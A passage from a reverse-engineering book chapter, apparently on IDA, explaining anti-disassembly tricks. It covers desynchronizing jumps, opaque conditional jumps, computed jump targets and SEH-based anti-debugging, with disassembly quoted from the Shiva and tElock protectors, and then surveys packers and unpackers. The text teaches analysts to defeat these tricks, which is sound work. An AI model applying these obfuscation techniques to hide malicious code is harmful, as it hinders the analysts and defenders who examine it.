href="#ftn.CHP-21-FN-1" id="CHP-21-FN-1">149</a>]</sup> anti–reverse engineering tool:</p><a id="I_programlisting2_d1e34880"/><pre class="programlisting">LOAD:0A04B0D1                 call  <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>near ptr loc_A04B0D6+1
  LOAD:0A04B0D6
  LOAD:0A04B0D6 loc_A04B0D6:                      ; CODE XREF: start+11↓p
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> LOAD:0A04B0D6                 mov     dword ptr [eax-73h], 0FFEB0A40h
  LOAD:0A04B0D6 start           endp
  LOAD:0A04B0D6
  LOAD:0A04B0DD
  LOAD:0A04B0DD loc_A04B0DD:                      ; CODE XREF: LOAD:0A04B14C↓j
  LOAD:0A04B0DD                 loopne  loc_A04B06F
  LOAD:0A04B0DF                 mov     dword ptr [eax+56h], 5CDAB950h
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/> LOAD:0A04B0E6                 iret
  LOAD:0A04B0E6 ;---------------------------------------------------------------
<img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/> LOAD:0A04B0E7                 db 47h
  LOAD:0A04B0E8                 db 31h, 0FFh, 66h
    LOAD:0A04B0EB ;---------------------------------------------------------------
  LOAD:0A04B0EB
  LOAD:0A04B0EB loc_A04B0EB:                      ; CODE XREF: LOAD:0A04B098↑j
  LOAD:0A04B0EB                 mov     edi, 0C7810D98h</pre><p>This example executes a call <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e34908"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> (a jump can just as easily be used) into the middle of an existing instruction <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e34914"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>. Since the function call is assumed to return, the succeeding instruction at address <code class="literal">0A04B0D6</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e34923"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> is disassembled (incorrectly). The actual target of the call instruction, <code class="literal">loc_A04B0D6+1</code> (<code class="literal">0A04B0D7</code>), cannot be disassembled because the associated bytes have already been incorporated into the 5-byte instruction at <code class="literal">0A04B0D6</code>. Assuming we notice that this is taking place, the remainder of the disassembly must be considered suspect. Evidence of this fact shows up in the form of unexpected user-space instructions <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e34939"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span> (in this case an <code class="literal">iret</code><sup>[<a class="footnote" href="#ftn.CHP-21-FN-2" id="CHP-21-FN-2">150</a>]</sup>) and miscellaneous databytes <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e34954"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span>.<a class="indexterm" id="IDX-CHP-21-0010"/><a class="indexterm" id="IDX-CHP-21-0011"/><a class="indexterm" id="IDX-CHP-21-0012"/></p><p>Note that this type of behavior is not restricted to IDA. Virtually all disassemblers, whether they utilize a recursive descent algorithm or a linear sweep algorithm, fall victim to this technique.</p><p>The proper way to deal with this situation in IDA is to undefine the instruction that contains the bytes that are the target of the call and then define an instruction at the call target address in an attempt to resynchronize the disassembly. Of course, the use of an interactive disassembler greatly simplifies this process. Using IDA, a quick Edit ▸ Undefine (hotkey U) with the cursor positioned at <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e34974"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> followed by an Edit ▸ Code (hotkey C) with the cursor repositioned on address <code class="literal">0A04B0D7</code> results in the listing shown here:</p><a id="I_programlisting2_d1e34983"/><pre class="programlisting">LOAD:0A04B0D1                 call    loc_A04B0D7
  LOAD:0A04B0D1 ;------------------------------------------------------------
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> LOAD:0A04B0D6                 db 0C7h ; ¦
  LOAD:0A04B0D7 ;------------------------------------------------------------
  LOAD:0A04B0D7
  LOAD:0A04B0D7 loc_A04B0D7:                   ; CODE XREF: start+11↑p
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> LOAD:0A04B0D7                 pop     eax
  LOAD:0A04B0D8                 lea     eax, [eax+0Ah]
  LOAD:0A04B0DB
  LOAD:0A04B0DB loc_A04B0DB:                   ; CODE XREF: start:loc_A04B0DB↑j
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/> LOAD:0A04B0DB                 jmp     short near ptr loc_A04B0DB+1
  LOAD:0A04B0DB start           endp
  LOAD:0A04B0DB
  LOAD:0A04B0DB ;------------------------------------------------------------
  LOAD:0A04B0DD                 db 0E0h ; a</pre><p>At this point, it is somewhat more obvious that the byte at address <code class="literal">0A04B0D6</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35008"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> is never executed. The instruction at <code class="literal">0A04B0D7</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35017"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> (the target of the call) is used to clear the return address (from the bogus call) off the stack, and execution continues. Note that is does not take long before the technique is used again, this time using a 2-byte jump instruction at address <code class="literal">0A04B0DB</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35027"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>, which actually jumps into the middle of itself. Here again, we are obligated to undefine an instruction in order to get to the start of the next instruction. One more application of the undefine (at <code class="literal">0A04B0DB</code>) and redefine (at <code class="literal">0A04B0DC</code>) processes yields the following disassembly:<a class="indexterm" id="IDX-CHP-21-0013"/><a class="indexterm" id="IDX-CHP-21-0014"/><a class="indexterm" id="IDX-CHP-21-0015"/><a class="indexterm" id="IDX-CHP-21-0016"/><a class="indexterm" id="IDX-CHP-21-0017"/></p><a id="I_programlisting2_d1e35054"/><pre class="programlisting"><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> LOAD:0A04B0D7                 pop     eax
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/> LOAD:0A04B0D8                 lea     eax, [eax+0Ah]
  LOAD:0A04B0D8 ; --------------------------------------------------------------
  LOAD:0A04B0DB                 db 0EBh ; d
  LOAD:0A04B0DC ; --------------------------------------------------------------
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> LOAD:0A04B0DC                 jmp     eax
  LOAD:0A04B0DC start           endp</pre><p>The target of the jump instruction turns out to be yet another jump instruction <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35075"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>. In this case, however, the jump is impossible for a disassembler (and potentially confusing to the human analyst) to follow, as the target of the jump is contained in a register (EAX) and computed at runtime. This is an example of another type of anti–static analysis technique, discussed in <a class="xref" href="ch21.html#dynamically_computed_target_addresses" title="Dynamically Computed Target Addresses">Dynamically Computed Target Addresses</a> in <a class="xref" href="ch21.html#dynamically_computed_target_addresses" title="Dynamically Computed Target Addresses">Dynamically Computed Target Addresses</a>. In this case the value contained in the EAX register is not difficult to determine given the relatively simple instruction sequence that precedes the jump. The <code class="literal">pop</code> instruction at <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35088"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> loads the return address from the call instruction in the previous example (<code class="literal">0A04B0D6</code>) into the EAX register, while the following instruction <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35098"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span> has the effect of adding 10 to EAX. Thus the target of the jump instruction is <code class="literal">0A04B0E0</code>, and this is the address at which we must resume the disassembly process.<a class="indexterm" id="IDX-CHP-21-0018"/></p><p>The final example of desynchronization taken from a different binary demonstrates how processor flags may be utilized to turn conditional jumps into absolute jumps. The following disassembly demonstrates the use of the x86 <code class="literal">Z</code> flag for just such a purpose:<a class="indexterm" id="IDX-CHP-21-0019"/><a class="indexterm" id="IDX-CHP-21-0020"/></p><a id="I_programlisting2_d1e35122"/><pre class="programlisting"><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> .text:00401000                 xor     eax, eax
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> .text:00401002                 jz      short near ptr loc_401009+1
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/> .text:00401004                 mov     ebx, [eax]
<img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/> .text:00401006                 mov     [ecx-4], ebx
  .text:00401009
  .text:00401009 loc_401009:                     ; CODE XREF: .text:00401002↑j
<img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/> .text:00401009                 call    near ptr 0ADFEFFC6h
  .text:0040100E                 ficom   word ptr [eax+59h]</pre><p>Here, the <code class="literal">xor</code> instruction <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35158"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> is used to zero the EAX register and set the x86 <code class="literal">Z</code> flag. The programmer, knowing that the <code class="literal">Z</code> flag is set, utilizes a jump-on-zero (<code class="literal">jz</code>) instruction <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35174"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>, which will always be taken, to attain the effect of an unconditional jump. As a result, the instructions <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35180"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span> and <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35186"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span> between the jump and the jump target will never be executed and serve only to confuse any analyst who fails to realize this fact. Note that, once again, this example obscures the actual jump target by jumping into the middle of an instruction <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35192"/><img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/></span>. Properly disassembled, the code should read as follows:<a class="indexterm" id="IDX-CHP-21-0021"/><a class="indexterm" id="IDX-CHP-21-0022"/><a class="indexterm" id="IDX-CHP-21-0023"/><a class="indexterm" id="IDX-CHP-21-0024"/><a class="indexterm" id="IDX-CHP-21-0025"/></p><a id="I_programlisting2_d1e35220"/><pre class="programlisting">.text:00401000                 xor     eax, eax
  .text:00401002                 jz      short loc_40100A
  .text:00401004                 mov     ebx, [eax]
  .text:00401006                 mov     [ecx-4], ebx
  .text:00401006 ; -------------------------------------------------------------
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> .text:00401009                 db 0E8h ; F
  .text:0040100A ; -------------------------------------------------------------
  .text:0040100A
  .text:0040100A loc_40100A:                     ; CODE XREF: .text:00401002↑j
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> .text:0040100A                 mov     eax, 0DEADBEEFh
  .text:0040100F                 push    eax
  .text:00401010                 pop     ecx</pre><p>The actual target of the jump <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35236"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> has been revealed, as has the extra byte <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35242"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> that caused the desynchronization in the first place. It is certainly possible to use far more roundabout ways of setting and testing flags prior to executing a conditional jump. The level of difficulty for analyzing such code increases with the number of operations that may affect the CPU flag bits prior to testing their value.<a class="indexterm" id="IDX-CHP-21-0026"/></p></div><div class="sect2" title="Dynamically Computed Target Addresses"><div class="titlepage"><div><div><h2 class="title"><a id="dynamically_computed_target_addresses"/>Dynamically Computed Target Addresses</h2></div></div></div><p>Do not confuse the title of this section with an anti–dynamic analysis technique. The phrase <span class="emphasis"><em>dynamically computed</em></span> simply means that an address to which execution will flow is computed at runtime. In this section we discuss several ways in which such an address can be derived. The intent of such techniques is to hide (obfuscate) the actual control flow path that a binary will follow from the prying eyes of the static analysis process.</p><p>One example of this technique was shown in the preceding section. The example used a <code class="literal">call</code> statement to place a return address on the stack. The return address was popped directly off the stack into a register, and a constant value was added to the register to derive the final target address, which was ultimately reached by performing a jump to the location specified by the register contents.</p><p>An infinite number of similar code sequences can be developed for deriving a target address and transferring control to that address. The following code, which wraps up the initial startup sequence in Shiva, demonstrates an alternate method for dynamically computing target addresses:</p><a id="I_programlisting2_d1e35266"/><pre class="programlisting">LOAD:0A04B3BE                 mov     ecx, 7F131760h  ; ecx = 7F131760
  LOAD:0A04B3C3                 xor     edi, edi        ; edi = 00000000
  LOAD:0A04B3C5                 mov     di, 1156h       ; edi = 00001156
  LOAD:0A04B3C9                 add     edi, 133AC000h  ; edi = 133AD156
  LOAD:0A04B3CF                 xor     ecx, edi        ; ecx = 6C29C636
    LOAD:0A04B3D1                 sub     ecx, 622545CEh  ; ecx = 0A048068
  LOAD:0A04B3D7                 mov     edi, ecx        ; edi = 0A048068
  LOAD:0A04B3D9                 pop     eax
  LOAD:0A04B3DA                 pop     esi
  LOAD:0A04B3DB                 pop     ebx
  LOAD:0A04B3DC                 pop     edx
  LOAD:0A04B3DD                 pop     ecx
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> LOAD:0A04B3DE                 xchg    edi, [esp]      ; TOS = 0A048068
  LOAD:0A04B3E1                 retn                    ; return to 0A048068</pre><p>The comments in the right-hand margin document the changes being made to various CPU registers at each instruction. The process culminates in a derived value being moved into the top position of the stack (<code class="literal">TOS</code>) <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35279"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>, which causes the return instruction to transfer control to the computed location (<code class="literal">0A048068</code> in this case). Code sequences such as these can significantly increase the amount of work that must be performed during static analysis, as the analyst must essentially run the code by hand to determine the actual control flow path taken in the program.<a class="indexterm" id="IDX-CHP-21-0027"/><a class="indexterm" id="IDX-CHP-21-0028"/></p><p>Much more complex types of control flow hiding have been developed and utilized in recent years. In the most complex cases, a program will use multiple threads or child processes to compute control flow information and receive that information via some form of interprocess communication (for child processes) or synchronization primitives (for multiple threads). In such cases, static analysis can become extremely difficult, as it becomes necessary to understand not only the behavior of multiple executable entities but also the exact manner by which those entities exchange information. For example, one thread may wait on a shared semaphore<sup>[<a class="footnote" href="#ftn.CHP-21-FN-3" id="CHP-21-FN-3">151</a>]</sup> object, while a second thread computes values or modifies code that the first thread will make use of once the second thread signals its completion via the semaphore.<a class="indexterm" id="IDX-CHP-21-0029"/></p><p>Another technique, frequently used within Windows-oriented malware, involves configuring an exception handler,<sup>[<a class="footnote" href="#ftn.CHP-21-FN-4" id="CHP-21-FN-4">152</a>]</sup> intentionally triggering an exception, and then manipulating the state of the process’s registers while handling the exception. The following example is used by the tElock anti–reverse engineering tool to obscure the program’s actual control flow:</p><a id="I_programlisting2_d1e35314"/><pre class="programlisting"><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> .shrink:0041D07A        call    $+5
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> .shrink:0041D07F        pop     ebp
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/> .shrink:0041D080        lea     eax, [ebp+46h]  ; eax holds 0041D07F + 46h
  .shrink:0041D081        inc     ebp
<img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/> .shrink:0041D083        push    eax
  .shrink:0041D084        xor     eax, eax
<img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/> .shrink:0041D086        push    dword ptr fs:[eax]
<img alt="" src="httpatomoreillycomsourcenostarchimages854101.png"/> .shrink:0041D089        mov     fs:[eax], esp
<img alt="" src="httpatomoreillycomsourcenostarchimages854103.png"/> .shrink:0041D08C        int     3               ; Trap to Debugger
  .shrink:0041D08D        nop
  .shrink:0041D08E        mov     eax, eax
  .shrink:0041D090        stc
  .shrink:0041D091        nop
  .shrink:0041D092        lea     eax, ds:1234h[ebx*2]
  .shrink:0041D099        clc
  .shrink:0041D09A        nop
  .shrink:0041D09B        shr     ebx, 5
  .shrink:0041D09E        cld
  .shrink:0041D09F        nop
  .shrink:0041D0A0        rol     eax, 7
  .shrink:0041D0A3        nop
  .shrink:0041D0A4        nop
<img alt="" src="httpatomoreillycomsourcenostarchimages854133.png"/> .shrink:0041D0A5        xor     ebx, ebx
<img alt="" src="httpatomoreillycomsourcenostarchimages854135.png"/> .shrink:0041D0A7        div     ebx             ; Divide by zero
  .shrink:0041D0A9        pop     dword ptr fs:0</pre><p>The sequence begins by using a call <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35372"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> to the next instruction <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35378"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>; the call instruction pushes <code class="literal">0041D07F</code> onto the stack as a return address, which is promptly popped off the stack into the EBP register <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35387"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>. Next <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35393"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>, the EAX register is set to the sum of EBP and <code class="literal">46h</code>, or <code class="literal">0041D0C5</code>, and this address is pushed onto the stack <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35406"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span> as the address of an exception handler function. The remainder of the exception handler setup takes place at <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35412"/><img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/></span> and <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35418"/><img alt="" src="httpatomoreillycomsourcenostarchimages854101.png"/></span>, which complete the process of linking the new exception handler into the existing chain of exception handlers referenced by <code class="literal">fs:[0]</code>.<sup>[<a class="footnote" href="#ftn.CHP-21-FN-5" id="CHP-21-FN-5">153</a>]</sup> The next step is to intentionally generate an exception <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35432"/><img alt="" src="httpatomoreillycomsourcenostarchimages854103.png"/></span>, in this case an <code class="literal">int 3</code>, which is a software trap (interrupt) to the debugger. In x86 programs, the <code class="literal">int 3</code> instruction is used by debuggers to implement a software breakpoint. Normally at this point, an attached debugger would gain control; in fact, if a debugger is attached, it will have the first opportunity to handle the exception, thinking that it is a breakpoint. In this case, the program fully expects to handle the exception, so any attached debugger must be instructed to pass the exception along to the program. Failing to allow the program to handle the exception may result in an incorrect operation and possibly a crash of the program. Without understanding how the <code class="literal">int 3</code> exception is handled, it is impossible to know what may happen next in this program. If we assume that execution simply resumes following the <code class="literal">int 3</code>, then it appears that a divide-by-zero exception will eventually be triggered by instructions <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35451"/><img alt="" src="httpatomoreillycomsourcenostarchimages854133.png"/></span> and <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35457"/><img alt="" src="httpatomoreillycomsourcenostarchimages854135.png"/></span>.<a class="indexterm" id="IDX-CHP-21-0030"/><a class="indexterm" id="IDX-CHP-21-0031"/><a class="indexterm" id="IDX-CHP-21-0032"/><a class="indexterm" id="IDX-CHP-21-0033"/><a class="indexterm" id="IDX-CHP-21-0034"/><a class="indexterm" id="IDX-CHP-21-0035"/><a class="indexterm" id="IDX-CHP-21-0036"/></p><p>The exception handler associated with the preceding code begins at address <code class="literal">0041D0C5</code>. The first portion of this function is shown here:</p><a id="I_programlisting2_d1e35490"/><pre class="programlisting">.shrink:0041D0C5 sub_41D0C5      proc near     ; DATA XREF: .stack:0012FF9C↑o
  .shrink:0041D0C5
  .shrink:0041D0C5 pEXCEPTION_RECORD  = dword ptr  4
  .shrink:0041D0C5 arg_4               = dword ptr  8
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> .shrink:0041D0C5 pCONTEXT            = dword ptr  0Ch
    .shrink:0041D0C5
<img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/> .shrink:0041D0C5        mov     eax, [esp+pEXCEPTION_RECORD]
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> .shrink:0041D0C9        mov     ecx, [esp+pCONTEXT]  ; Address of SEH CONTEXT
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/> .shrink:0041D0CD        inc     [ecx+CONTEXT._Eip]   ; Modify saved eip
<img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/> .shrink:0041D0D3        mov     eax, [eax]           ; Obtain exception type
<img alt="" src="httpatomoreillycomsourcenostarchimages854101.png"/> .shrink:0041D0D5        cmp     eax, EXCEPTION_INT_DIVIDE_BY_ZERO
  .shrink:0041D0DA        jnz     short loc_41D100
  .shrink:0041D0DC        inc     [ecx+CONTEXT._Eip]   ; Modify eip again
<img alt="" src="httpatomoreillycomsourcenostarchimages854103.png"/> .shrink:0041D0E2
        xor     eax, eax             ; Zero x86 debug registers
  .shrink:0041D0E4        and     [ecx+CONTEXT.Dr0], eax
  .shrink:0041D0E7        and     [ecx+CONTEXT.Dr1], eax
  .shrink:0041D0EA        and     [ecx+CONTEXT.Dr2], eax
  .shrink:0041D0ED        and     [ecx+CONTEXT.Dr3], eax
  .shrink:0041D0F0        and     [ecx+CONTEXT.Dr6], 0FFFF0FF0h
  .shrink:0041D0F7        and     [ecx+CONTEXT.Dr7], 0DC00h
  .shrink:0041D0FE        jmp     short locret_41D160</pre><p>The third argument <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35537"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> to the exception handler function is a pointer to a Windows <code class="literal">CONTEXT</code> structure (defined in the Windows API header file <span class="emphasis"><em>winnt.h</em></span>). The <code class="literal">CONTEXT</code> structure is initialized with the contents of all CPU registers as they existed at the time of the exception. An exception handler has the opportunity to inspect and, if desired, modify the contents of the <code class="literal">CONTEXT</code> structure. If the exception handler feels that it has corrected the problem that led to the exception, it can notify the operating system that the offending thread should be allowed to continue. At this point the operating system reloads the CPU registers for the thread from the <code class="literal">CONTEXT</code> structure that was provided to the exception handler, and execution of the thread resumes as if nothing had ever happened.<a class="indexterm" id="IDX-CHP-21-0037"/><a class="indexterm" id="IDX-CHP-21-0038"/><a class="indexterm" id="IDX-CHP-21-0039"/></p><p>In the preceding example, the exception handler begins by accessing the thread’s <code class="literal">CONTEXT</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35573"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> in order to increment the instruction pointer <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35579"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>, thus moving beyond the instruction that generated the exception. Next, the exception’s type code (a field within the provided <code class="literal">EXCEPTION_RECORD</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35588"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span>) is retrieved <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35595"/><img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/></span> in order to determine the nature of the exception. This portion of the exception handler deals with the divide-by-zero error <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35601"/><img alt="" src="httpatomoreillycomsourcenostarchimages854101.png"/></span>, generated in the previous example, by zeroing <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35607"/><img alt="" src="httpatomoreillycomsourcenostarchimages854103.png"/></span> all of the x86 hardware debugging registers.<sup>[<a class="footnote" href="#ftn.CHP-21-FN-6" id="CHP-21-FN-6">154</a>]</sup> Without examining the remainder of the tElock code, it is not immediately apparent why the debug registers are being cleared. In this case, tElock is clearing values from a previous operation in which it used the debug registers to set four breakpoints in addition to the <code class="literal">int 3</code> seen previously. In addition to obfuscating the true flow of the program, clearing or modifying the x86 debug registers can wreak havoc with software debuggers such as OllyDbg or IDA’s own internal debugger. Such anti-debugging techniques are discussed in <a class="xref" href="ch21s02.html" title="Anti–Dynamic Analysis Techniques">Anti–Dynamic Analysis Techniques</a> in <a class="xref" href="ch21s02.html" title="Anti–Dynamic Analysis Techniques">Anti–Dynamic Analysis Techniques</a>.<a class="indexterm" id="IDX-CHP-21-0040"/><a class="indexterm" id="IDX-CHP-21-0041"/></p><div class="sect3" title="Opcode Obfuscation"><div class="titlepage"><div><div><h3 class="title"><a id="opcode_obfuscation"/>Opcode Obfuscation</h3></div></div></div><p>While the techniques described to this point may provide—in fact, are intended to provide—a hindrance to understanding a program’s control flow, none prevent you from observing the correct disassembled form of a program you are analyzing. Desynchronization had the greatest impact on the disassembly, but it was easily defeated by reformatting the disassembly to reflect the correct instruction flow.<a class="indexterm" id="IDX-CHP-21-0042"/><a class="indexterm" id="IDX-CHP-21-0043"/></p><p>A more effective technique for preventing correct disassembly is to encode or encrypt the actual instructions when the executable file is being created. The obfuscated instructions are useless to the CPU and must be de-obfuscated back to their original form before they are fetched for execution by the CPU. Therefore, at least some portion of the program must remain unencrypted in order to serve as the startup routine, which, in the case of an obfuscated program, is usually responsible for de-obfuscating some or all of the remainder of the program. A very generic overview of the obfuscation process is shown in <a class="xref" href="ch21.html#generic_obfuscation_process" title="Figure 21-1. Generic obfuscation process">Figure 21-1</a>.<a class="indexterm" id="IDX-CHP-21-0044"/></p><div class="figure"><a id="generic_obfuscation_process"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject2_d1e35673"/><img alt="Generic obfuscation process" src="httpatomoreillycomsourcenostarchimages854316.png"/></div></div><p class="title">Figure 21-1. Generic obfuscation process</p></div><p>As shown, the input to the process is a program that a user wishes to obfuscate for some reason. In many cases, the input program is written using standard programming languages and build tools (editors, compilers, and the like) with little thought required about the obfuscation to come. The resulting executable file is fed into an obfuscation utility, which transforms the binary into a functionally equivalent, yet obfuscated, binary. As depicted, the obfuscation utility is responsible for obfuscating the original program’s code and data sections and adding additional code (a de-obfuscation stub) that performs the task of de-obfuscating the code and data before the original functionality can be accessed at runtime. The obfuscation utility also modifies the program headers to redirect the program entry point to the de-obfuscation stub, ensuring that execution begins with the de-obfuscation process. Following de-obfuscation, execution typically transfers to the entry point of the original program, which begins execution as if it had never been obfuscated at all.<a class="indexterm" id="IDX-CHP-21-0045"/></p><p>This oversimplified process varies widely based on the obfuscation utility that is used to create the obfuscated binary. An ever-increasing number of utilities are available to handle the obfuscation process. Such utilities offer features ranging from compression to anti-disassembly and anti-debugging techniques. Examples include programs such as UPX<sup>[<a class="footnote" href="#ftn.CHP-21-FN-7" id="CHP-21-FN-7">155</a>]</sup> (compressor, also works with ELF), ASPack<sup>[<a class="footnote" href="#ftn.CHP-21-FN-8" id="CHP-21-FN-8">156</a>]</sup> (compressor), ASProtect (anti–reverse engineering by the makers of ASPack), and tElock<sup>[<a class="footnote" href="#ftn.CHP-21-FN-9" id="CHP-21-FN-9">157</a>]</sup> (compression and anti–reverse engineering) for Windows PE files, and Burneye<sup>[<a class="footnote" href="#ftn.CHP-21-FN-10" id="CHP-21-FN-10">158</a>]</sup> (encryption) and Shiva<sup>[<a class="footnote" href="#ftn.CHP-21-FN-11" id="CHP-21-FN-11">159</a>]</sup> (encryption and anti-debugging) for Linux ELF binaries. The capabilities of obfuscation utilities have advanced to the point that some anti–reverse engineering tools such as WinLicense<sup>[<a class="footnote" href="#ftn.CHP-21-FN-12" id="CHP-21-FN-12">160</a>]</sup> provide more integration throughout the entire build process, allowing programmers to integrate anti–reverse engineering features at every step, from source code through post-processing the compiled binary file.<a class="indexterm" id="IDX-CHP-21-0046"/><a class="indexterm" id="IDX-CHP-21-0047"/><a class="indexterm" id="IDX-CHP-21-0048"/><a class="indexterm" id="IDX-CHP-21-0049"/><a class="indexterm" id="IDX-CHP-21-0050"/><a class="indexterm" id="IDX-CHP-21-0051"/></p><p>A more recent evolution in the world of obfuscation programs involves wrapping the original executable with a virtual machine execution engine. Depending on the sophistication of the virtualizing obfuscator, the original machine code may never execute directly; instead that code is interpreted by a byte code–oriented virtual machine. Very sophisticated virtualizers are capable of generating unique virtual machine instances each time they run, making it difficult to create an all-purpose de-obfuscation algorithm to defeat them. VMProtect<sup>[<a class="footnote" href="#ftn.CHP-21-FN-13" id="CHP-21-FN-13">161</a>]</sup> is one example of a virtualizing obfuscator. VMProtect was used to obfuscate the Clampi<sup>[<a class="footnote" href="#ftn.CHP-21-FN-14" id="CHP-21-FN-14">162</a>]</sup> trojan.<a class="indexterm" id="IDX-CHP-21-0052"/><a class="indexterm" id="IDX-CHP-21-0053"/></p><p>As with any offensive technology, defensive measures have been developed to counter many anti–reverse engineering tools. In most cases the goal of such tools is to recover the original, unprotected executable file (or a reasonable facsimile), which can then be analyzed using more traditional tools such as disassemblers and debuggers. One such tool designed to de-obfuscate Windows executables is called QuickUnpack.<sup>[<a class="footnote" href="#ftn.CHP-21-FN-15" id="CHP-21-FN-15">163</a>]</sup> QuickUnpack, like many other automated unpackers, operates by functioning as a debugger and allowing an obfuscated binary to execute through its de-obfuscation phase and then capturing the process image from memory. Beware that this type of tool actually runs potentially malicious programs in the hope of intercepting the execution of those programs after they have unpacked or de-obfuscated themselves but before they have a chance to do anything malicious. Thus, you should always execute such programs in a sandbox-type environment.<a class="indexterm" id="IDX-CHP-21-0054"/></p><p>Using a purely static analysis environment to analyze obfuscated code is a challenging task at best. Without being able to execute the de-obfuscation stub, some means of unpacking or decrypting the obfuscated portions of the binary must be employed before disassembly of the obfuscated code can begin. <a class="xref" href="ch21.html#ida_navigation_band_for_a_binary_packed" title="Figure 21-2. IDA navigation band for a binary packed using UPX">Figure 21-2</a> shows the layout of an executable that has been packed using the UPX packer. The only portion of the address space that IDA has identified as code is the thin stripe at <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35781"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>, which happens to be the UPX 